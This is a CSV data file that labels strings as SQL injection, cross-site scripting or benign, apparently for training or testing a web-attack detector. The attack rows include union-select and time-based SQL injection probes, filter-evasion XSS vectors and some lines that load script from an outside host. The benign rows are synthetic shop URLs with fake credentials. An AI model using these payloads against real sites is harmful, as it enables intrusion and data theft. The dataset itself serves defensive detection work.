payload,type
"sn: select * from users where id='1' union select ""[""_,version() -- 1'",sqli
"s&noU: select * from users where id='1' or $<\ union select 1,@@VERSION -- 1'",sqli
or 1=1/*,sqli
"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
lesaca clar,benign
s&o1&: select * from users where id='1' or \<1 or 1=1 -- 1',sqli
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",xss
"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",xss
"<XSS STYLE=""behavior: url(xss.htc);"">",xss
"<IMG LOWSRC=""javascript:javascript:alert(1)"">",xss
index.jsp,benign
imagenes/3.gif,benign
1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--,sqli
a' order by 9999-- #,sqli
"s?os: select * from users where id=1 or ""?%"" or 1=1 -- 1",sqli
"UEo1,: select * from users where id=1 union select !<1,version() -- 1",sqli
"snUEs: select * from users where id=1 or 1#""$ union select 'a',version() -- 1",sqli
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
"<a href=""javas\x01cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<--`<img/src=` onerror=alert(1)> --!>,xss
"oovUE: select * from users where id=1 <@&@ union select 1,version() -- 1",sqli
"<a href=""\x03javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<div style=""font-family:foo}color=red;"">XXX",xss
<svg contentScriptType=text/vbs><script>MsgBox+1,xss
".UEv,: select * from users where id=1. union select null,version() -- 1",sqli
"<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"UEvkn: select * from users where id=1   union select null,banner from v$version where rownum=1 -- 1",sqli
"s,:s: select * from users where id=1 or "",:""=1 or 1=1 -- 1",sqli
" or ""*",sqli
5.66E+15,benign
"<LAYER SRC=""%(scriptlet)s""></LAYER>",xss
"ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(1)"">DEF",xss
publico/caracteristicas.jsp?id=2,benign
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",xss
"<img src\x13=x onerror=""javascript:alert(1)"">",xss
publico/productos.jsp,benign
publico/caracteristicas.jsp?id=2,benign
"<div/onmouseover='alert(1)'> style=""x:"">",xss
"UEvn,: select * from users where id=1 union select @ _,version() -- 1",sqli
badajoz,benign
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
38821598j,benign
index.jsp,benign
"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",xss
"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",xss
"<a href=""\x0Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss
imagenes/2.gif,benign
"c/ venus 91, 1e",benign
a' and '456'='678,sqli
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
publico/caracteristicas.jsp?id=2,benign
"s?:s: select * from users where id=1 or ""]:"" or 1=1 -- 1",sqli
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",xss
)&1c: select * from users where id=1 +(\) or 1=1 -- 1,sqli
<script>/* *\x2A/javascript:alert(1)// */</script>,xss
miembros/imagenes/castro.jpg,benign
"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",xss
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"""`'><script>\x0Djavascript:alert(1)</script>",xss
" or true--
' or true--
) or true--",sqli
1oo&1: select * from users where id=1 + \+%\ or 1=1 -- 1,sqli
"a"" and ""456""=""678",sqli
miembros/salir.jsp,benign
publico/productos.jsp,benign
"s{;s: select * from users where id=1 or ""{;"" or 1=1 -- 1",sqli
"<img \x39src=x onerror=""javascript:alert(1)"">",xss
&.o1&: select * from users where id=1 or \.<1 or 1=1 -- 1,sqli
&ov&1: select * from users where id=1 or !<@ or 1=1 -- 1,sqli
"<body src=1 href=1 onerror=""javascript:alert(1)""></body>",xss
"<a href=""\x09javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss
miembros/imagenes/zarauz.jpg,benign
<input onblur=javascript:alert(1) autofocus><input autofocus>,xss
') or true--,sqli
miembros/imagenes/castro.jpg,benign
"s&o.U: select * from users where id='1' or \<\. union select 1,@@VERSION -- 1'",sqli
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
1 waitfor delay '0:0:X'--,sqli
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>,xss
"s)1s: select * from users where id=1 or "")1"" or 1=1 -- 1",sqli
"""><img src=x onerror=window.open('https://www.google.com/');>",xss
publico/productos.jsp,benign
bettine,benign
"ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",xss
hlinka,benign
"1c: select * from users where id=11<1# union select 1,version() -- 1",sqli
"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",xss
"<video src=1 href=1 onerror=""javascript:alert(1)""></video>",xss
empeine,benign
"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
publico/miembros.jsp,benign
345'%5d|//*|/a%5b'a,sqli
ciudad real,benign
"<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"vc: select * from users where id=1 + @<1# union select 1,version() -- 1",sqli
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",sqli
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss
"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss
"1)UE1: select * from users where id=1 +(1) union select 1,banner from v$version where rownum=1 -- 1",sqli
augur,benign
"1oo1U: select * from users where id=1 + \+%1 union select null,@@VERSION -- 1",sqli
miembros/imagenes/castro.jpg,benign
"<table background=""javascript:javascript:alert(1)"">",xss
"s:UEf: select * from users where id=1 or 1#"": union select version(),version() -- 1",sqli
"""`'><script>\xE2\x80\x85javascript:alert(1)</script>",xss
"ABC<div style=""x:\xC2\xA0expression(javascript:alert(1)"">DEF",xss
"travesia doctor sanchez, 139, 12?h",benign
"<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1)//'>",xss
"s(1s: select * from users where id=1 or ""(1"" or 1=1 -- 1",sqli
07441681p,benign
"""`'><script>\xE2\x80\x87javascript:alert(1)</script>",xss
"<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
&n1&1: select * from users where id=1 or $ 1=1 or 1=1 -- 1,sqli
global/menum.jsp,benign
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=39&B1=A%F1adir+al+carrito,benign
"s,.s: select * from users where id=1 or "",."" or 1=1 -- 1",sqli
"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",xss
"<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d",xss
"<img src onerror /"" '""= alt=javascript:alert(1)//"">",xss
gelber serarols,benign
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
siku@tartasconamor.in,benign
miembros/imagenes/ogono.jpg,benign
a' and 'fghi'='fghj'-- #,sqli
"UEv&1: select * from users where id=1 union select @||1,version() -- 1",sqli
"<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"&vc: select * from users where id=1 or  @$#=1 union select 1,version() -- 1",sqli
on1&1: select * from users where id=1 %$ 1 or 1=1 -- 1,sqli
")) or ((x""))=((""x",sqli
"<img\x13src=x onerror=""javascript:alert(1)"">",xss
admin' or 1=1#,sqli
"1') or benchmark(100000000,MD5(1))#",sqli
a'or/*g*/345=345-- #,sqli
' ',sqli
"345')%5d|//*|/a%5bcontains(a,'b",sqli
"""`'><script>\x3Bjavascript:alert(1)</script>",xss
<svg><script ?>alert(1),xss
"s:c: select * from users where id=1 or "":#"" or 1=1 -- 1",sqli
"sUE1s: select * from users where id='1' union select 1""!"",banner from v$version where rownum=1 -- 1'",sqli
reiji,benign
"s:{s: select * from users where id=1 or "":{"" or 1=1 -- 1",sqli
<img/src=`%00` onerror=this.onerror=confirm(1) ,xss
"<a href=""\x05javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/pagar.jsp?modo=insertar&precio=9209&B1=Confirmar,benign
global/estilos.css,benign
"s(o1U: select * from users where id=1 or @#""(=1 union select 1,version() -- 1",sqli
"svUEs: select * from users where id=1 or 1#""@ union select 'a',version() -- 1",sqli
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=83&B1=A%F1adir+al+carrito,benign
*,sqli
publico/pagar.jsp?modo=insertar&precio=9334&B1=Confirmar,benign
"s&ovU: select * from users where id='1' or !<@ union select 1,version() -- 1'",sqli
"<! foo=""><script>javascript:alert(1)</script>"">",xss
"<a href=""\x14javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
a' and 'fghi'='fghj'#,sqli
"s;&1c: select * from users where id=1 or 1#""; or 1=1 -- 1",sqli
a' and 'fghi'='fghj'-- #,sqli
"'`""><\x00script>javascript:alert(1)</script>",xss
"<META HTTP-EQUIV=""Link"" Content=""<%(css)s>; REL=stylesheet"">",xss
"s{)s: select * from users where id=1 or ""{)"" or 1=1 -- 1",sqli
"plza. carmelo solis, 78, 4?g",benign
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=20&B1=A%F1adir+al+carrito,benign
"<BASE HREF=""javascript:alert('XSS');//"">",xss
"""`'><script>\xE2\x80\x83javascript:alert(1)</script>",xss
van_eyk,benign
global/menum.jsp,benign
"so(.): select * from users where id='1' + (\.) union select 1,@@VERSION -- 1'",sqli
a' or '345'='345,sqli
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
"`""'><img src=xxx:x onerror\x00=javascript:alert(1)>",xss
".UEvc: select * from users where id=1 +\. union select null,@@VERSION -- 1",sqli
"c/ fray diego de cadiz, 50",benign
"sUEn.: select * from users where id='1' union select $ .,@@VERSION -- 1'",sqli
index.jsp,benign
"""`'><script>\xC2\xA0javascript:alert(1)</script>",xss
miembros/index.jsp,benign
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",xss
"so(1): select * from users where id='1' *(1) union select 1,banner from v$version where rownum=1 -- 1'",sqli
"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",xss
"&.oo1: select * from users where id=1 or \.< =1 union select 1,@@VERSION -- 1",sqli
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
a'||/**/345=345#,sqli
3902,benign
"1 or benchmark(100000000,MD5(1))#",sqli
"s(os: select * from users where id=1 or ""(&"" or 1=1 -- 1",sqli
admin' or 1=1--,sqli
or 1=1-- ,sqli
"<IMG SRC=""jav    ascript:javascript:alert(1);"">",xss
"""`'><script>\xE3\x80\x80javascript:alert(1)</script>",xss
"s?o1&: select * from users where id=1 or 1#""?=1 or 1=1 -- 1",sqli
"UE1o,: select * from users where id=1 union select 1<@,version() -- 1",sqli
or true--,sqli
"ABC<div style=""x:\xE2\x80\x87expression(javascript:alert(1)"">DEF",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
miembros/editar.jsp?modo=registro&login=mauro&password=PON38rA1L9&nombre=Mirko&apellidos=Valeri+Arlat&email=griffith_chesbro%40psykoterapeut.sn&dni=68133766S&direccion=Urbanitzacio+Canyet+24%2C+4%3FA&ciudad=Vall+de+Bianya%2C+La&cp=21208&provincia=Guadalajara&ntc=6202740443449579&B1=Registrar,benign
imagenes/nuestratierra.jpg,benign
"<A HREF=""htt    p://6    6.000146.0x7.147/"">XSS</A>",xss
"<BR SIZE=""&{javascript:alert(1)}"">",xss
"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X",xss
"s?1s: select * from users where id=1 or ""]1"" or 1=1 -- 1",sqli
sandberg@3horas.tl,benign
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",xss
publico/registro.jsp?modo=registro&login=tiedeman&password=ag2u7a&nombre=Sayara&apellidos=Carta%F1a&email=albertini_trauberg%40theroxyblue.jo&dni=71814891J&direccion=C%2F+Gamos+5%2C+11-H&ciudad=Casabermeja&cp=44707&provincia=Alicante&ntc=4856355827488327&B1=Registrar,benign
"<a href=""\xE2\x81\x9Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"s:UEv: select * from users where id=1 or 1#"": union select null,version() -- 1",sqli
"<a href=""\xE2\x80\x85javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
valdivieso,benign
miembros/imagenes/ogono.jpg,benign
imagenes/3.gif,benign
"""`'><script>\x7Ejavascript:alert(1)</script>",xss
3814,benign
miembros/imagenes/castro.jpg,benign
3471,benign
"s;v: select * from users where id=1 or "";@"" or 1=1 -- 1",sqli
"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",xss
a'||/**/456=678#,sqli
"ABC<div style=""x:\x20expression(javascript:alert(1)"">DEF",xss
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
03344221k,benign
imagenes/2.gif,benign
"<BASE HREF=""javascript:javascript:alert(1);//"">",xss
"snns: select * from users where id=1 or ""$_"" or 1=1 -- 1",sqli
"sooUE: select * from users where id='1' <@<@ union select 1,version() -- 1'",sqli
ribadumia,benign
"<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",xss
"<img src=x onerror=\x32""javascript:alert(1)"">",xss
"`""'><img src=xxx:x \x0Donerror=javascript:alert(1)>",xss
imagenes/1.gif,benign
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",xss
"<STYLE type=""text/css"">BODY{background:url(""javascript:javascript:alert(1)"")}</STYLE>",xss
global/titulo.jsp,benign
"<x style=""behavior:url(%(sct)s)"">",xss
"o.UE1: select * from users where id=1 <@. union select 1,version() -- 1",sqli
z5r1174osa,benign
global/creditos.jsp,benign
publico/miembros.jsp,benign
"s()s: select * from users where id=1 or ""()"" or 1=1 -- 1",sqli
"s?c: select * from users where id=1 or ""?#"" or 1=1 -- 1",sqli
"UEv&v: select * from users where id=1 union select @&&@,version() -- 1",sqli
"sv)s: select * from users where id=1 or ""@)"" or 1=1 -- 1",sqli
"s{v: select * from users where id=1 or ""{@"" or 1=1 -- 1",sqli
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ​",xss
<svg contentScriptType=text/vbs><script>MsgBox+1,xss
"<a href=""\x06javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/3.gif,benign
"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",xss
global/titulo.jsp,benign
"1)) or benchmark(100000000,MD5(1))#",sqli
"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",xss
"c/ barriada nueva andalucia, 79, 5?f",benign
"<img src\x32=x onerror=""javascript:alert(1)"">",xss
6.61E+15,benign
"<a href=""javascript\x0A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<style onLoad style onLoad=""javascript:javascript:alert(1)""></style onLoad>",xss
flavio,benign
almendros,benign
story.darby@hostingprofessional.mv,benign
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
"s1UEf: select * from users where id=1 or 1#""1 union select version(),version() -- 1",sqli
"""`'><script>\x21javascript:alert(1)</script>",xss
".o1UE: select * from users where id=1.*1 union select 1,banner from v$version where rownum=1 -- 1",sqli
lanfranchi@getgold.tl,benign
'-',sqli
"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"UE1&v: select * from users where id=1 union select 1||@,version() -- 1",sqli
"1&1UE: select * from users where id=11||1 union select 1,banner from v$version where rownum=1 -- 1",sqli
"<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>",xss
"""`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>",xss
terl6z,benign
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,xss
"ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF",xss
<script\x2F>javascript:alert(1)</script>,xss
miembros/imagenes/zarauz.jpg,benign
"<div id=""div1""><input value=""``onmouseover=javascript:alert(1)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>",xss
"sonnU: select * from users where id='1' <@$_ union select 1,version() -- 1'",sqli
"sn?s: select * from users where id=1 or ""$?"" or 1=1 -- 1",sqli
"s)n: select * from users where id=1 or "")["" or 1=1 -- 1",sqli
<div style=content:url(%(svg)s)></div>,xss
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
a' order by 1-- #,sqli
<script>+-+-1-+-+alert(1)</script>,xss
publico/miembros.jsp,benign
"v: select * from users where id=1 + @`\` union select 1,version() -- 1",sqli
imagenes/cmenbul.gif,benign
"'`""><\x3Cscript>javascript:alert(1)</script>        ",xss
<script ^__^>alert(String.fromCharCode(49))</script ^__^,xss
<body/onload=&lt;!--&gt;&#10alert(1)>,xss
"<embed src=""data:text/html;base64,%(base64)s"">",xss
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",xss
"oo1UE: select * from users where id=1 | |1 union select 1,banner from v$version where rownum=1 -- 1",sqli
"UEoo1: select * from users where id=1 union select +!<1,version() -- 1",sqli
"s,(s: select * from users where id=1 or "",("" or 1=1 -- 1",sqli
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,xss
imagenes/3.gif,benign
makazaga millares,benign
miembros/imagenes/ogono.jpg,benign
<form><button formaction=javascript&colon;alert(1)>CLICKME,xss
"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1)"">DEF",xss
miembros/imagenes/castro.jpg,benign
publico/carrito.jsp,benign
"1') or benchmark(100000000,MD5(1))#",sqli
miembros/editar.jsp?modo=registro&login=carilyn&password=e1pirativo&nombre=Aventino&apellidos=Abell%F3+Lamarca&email=plang_schallert%40white-pearl-resort.kp&dni=66718383Y&direccion=C%2F+Misericordia%2C+57+7-H&ciudad=Baides&cp=35231&provincia=Valladolid&ntc=6302817063301722&B1=Registrar,benign
"s{,s: select * from users where id=1 or ""{,""=1 or 1=1 -- 1",sqli
"UEv1n: select * from users where id=1 union select @ 1a,version() -- 1",sqli
"<img src\x11=x onerror=""javascript:alert(1)"">",xss
"<a href=""\x0Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
1)); waitfor delay '0:0:X'--,sqli
<input value=<><iframe/src=javascript:confirm(1),xss
beaumont@lasmilyuna.gi,benign
"s(.s: select * from users where id=1 or ""(."" or 1=1 -- 1",sqli
"<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"s;(s: select * from users where id=1 or "";("" or 1=1 -- 1",sqli
o&1c: select * from users where id=1 <@ or 1=1 -- 1,sqli
"`""'><img src=xxx:x \x09onerror=javascript:alert(1)>",xss
"<image src=""javascript:alert(1)"">",xss
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
<svg><script ?>alert(1),xss
imagenes/nuestratierra.jpg,benign
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",xss
".oUE1: select * from users where id=1. <@ union select 1,version() -- 1",sqli
"svUEf: select * from users where id=1 or 1#""@ union select version(),version() -- 1",sqli
katia,benign
<!--[if]><script>javascript:alert(1)</script -->,xss
"""/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",xss
publico/pagar.jsp?modo=insertar&precio=8271&B1=Pasar+por+caja,benign
miembros/salir.jsp,benign
imagenes/3.gif,benign
".onUE: select * from users where id=1.<@$ union select 1,version() -- 1",sqli
petree,benign
"admin"" or ""1""=""1""--",sqli
"<a href=""\x1Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/nuestratierra.jpg,benign
&.on&: select * from users where id=1 or \.<$ or 1=1 -- 1,sqli
"UE1nk: select * from users where id=1 union select 1a,banner from v$version where rownum=1 -- 1",sqli
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss
"&1ovc: select * from users where id=1 or 1&@#=1 union select 1,version() -- 1",sqli
global/creditos.jsp,benign
index.jsp,benign
"voc: select * from users where id=1 + @<@# union select null,version() -- 1",sqli
"vo.UE: select * from users where id=1 + @<@. union select 1,version() -- 1",sqli
"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",xss
o()&1: select * from users where id=1 %(\) or 1=1 -- 1,sqli
"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",xss
"s&oo1: select * from users where id='1' or \< =1 union select 1,@@VERSION -- 1'",sqli
ambiental,benign
"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",xss
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""%(scriptlet)s""></OBJECT>",xss
"<img\x11src=x onerror=""javascript:alert(1)"">",xss
pavlow@permutatucasa.fm,benign
index.jsp,benign
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
"<form><button formaction=""javascript:javascript:alert(1)"">X",xss
"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",xss
<input value=<><iframe/src=javascript:confirm(1),xss
n1&1c: select * from users where id=1 +$ 1 or 1=1 -- 1,sqli
"s)v: select * from users where id=1 or "")@"" or 1=1 -- 1",sqli
"<?xml version=""1.0""?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>",xss
so..&: select * from users where id='1'<@.. or 1=1 -- 1',sqli
"carlos trivio moreno, 2,",benign
"admin"") or (""1""=""1",sqli
a'and/*g*/456=678-- #,sqli
"<XSS STYLE=""xss:expression(javascript:alert(1))"">",xss
admin') or ('1'='1'/*,sqli
"s1c: select * from users where id=1 or ""1#"" or 1=1 -- 1",sqli
"sos: select * from users where id='1'<@$$ union select 1,version() -- 1'",sqli
.o&1c: select * from users where id=1. <@ or 1=1 -- 1,sqli
"s&1UE: select * from users where id='1' ||1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
"<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>",xss
"ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF",xss
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
oo&1c: select * from users where id=1 <@<@ or 1=1 -- 1,sqli
"`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",xss
"<div/onmouseover='alert(1)'> style=""x:"">",xss
a' order by 9999#,sqli
miembros/imagenes/castro.jpg,benign
"<a href=""\xE2\x80\x88javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x17javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<script src=""data:text/javascript,alert(1)""></script>",xss
tomkin,benign
imagenes/1.gif,benign
"sons: select * from users where id=1 or ""%_"" or 1=1 -- 1",sqli
brines grimalda,benign
"s&.on: select * from users where id='1' or \.<$ union select 1,@@VERSION -- 1'",sqli
"<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>",xss
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"1oUEf: select * from users where id=1 +1<@ union select version(),version() -- 1",sqli
a' or 'dfth'='dfth'-- #,sqli
"so..U: select * from users where id='1'<@.. union select 1,version() -- 1'",sqli
"snUEv: select * from users where id=1 or 1#""$ union select null,version() -- 1",sqli
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",sqli
publico/caracteristicas.jsp?id=1,benign
index.jsp,benign
"s&.oo: select * from users where id='1' or \.< =1 union select 1,@@VERSION -- 1'",sqli
imagenes/3.gif,benign
"<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",xss
miembros/editar.jsp?modo=registro&login=zoratti&password=C9b4%2BtAL&nombre=Rabulas&apellidos=Documet+Recasens&email=gavin%40apagado.com.pk&dni=20048048Y&direccion=General+Lacy%2C+122+&ciudad=Roda+de+Andaluc%EDa%2C+La&cp=08611&provincia=Barcelona&ntc=2557912970687783&B1=Registrar,benign
"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss
"<a href=""\x1Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"s,os: select * from users where id=1 or "",&"" or 1=1 -- 1",sqli
publico/autenticar.jsp?modo=entrar&login=yutaka&pwd=OficioS%24O&remember=off&B1=Entrar,benign
miembros/imagenes/ogono.jpg,benign
"s1ns: select * from users where id=1 or ""1_"" or 1=1 -- 1",sqli
"<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"s{.s: select * from users where id=1 or ""{."" or 1=1 -- 1",sqli
jaspe ochoa,benign
"s;)s: select * from users where id=1 or "";)""=1 or 1=1 -- 1",sqli
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
"s1?s: select * from users where id=1 or ""1]"" or 1=1 -- 1",sqli
miembros/imagenes/castro.jpg,benign
"<img\x32src=x onerror=""javascript:alert(1)"">",xss
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
2/*f*/and/*f*/456=678,sqli
1.53E+15,benign
adolfo,benign
o1n&1: select * from users where id=1 <@1$ or 1=1 -- 1,sqli
<IMG SRC=`javascript:javascript:alert(1)`>,xss
imagenes/logo.gif,benign
"<a href=""\xE2\x80\xA8javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
1'); waitfor delay '0:0:X'--,sqli
dumensnil@bidrain.tr,benign
"s1UEv: select * from users where id=1 or 1#""1 union select null,version() -- 1",sqli
miembros/index.jsp,benign
<SCRIPT SRC=//ha.ckers.org/.j>,xss
<iframe/src \/\/onload = prompt(1),xss
"""'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>",xss
"admin"" or 1=1/*",sqli
"s{UE1: select * from users where id=1 or 1#""{ union select 1,version() -- 1",sqli
<script>/* *\x00/javascript:alert(1)// */</script>,xss
"s.v: select * from users where id=1 or "".@"" or 1=1 -- 1",sqli
"admin""or 1=1 or """"=""",sqli
"<x style=""background:url('x&#1;;color:red;/*')"">XXX</x>",xss
"<IMG SRC= onmouseover=""alert('xxs')"">",xss
.o.&1: select * from users where id=1.<@. or 1=1 -- 1,sqli
index.jsp,benign
"sUEov: select * from users where id='1' union select !<@,version() -- 1'",sqli
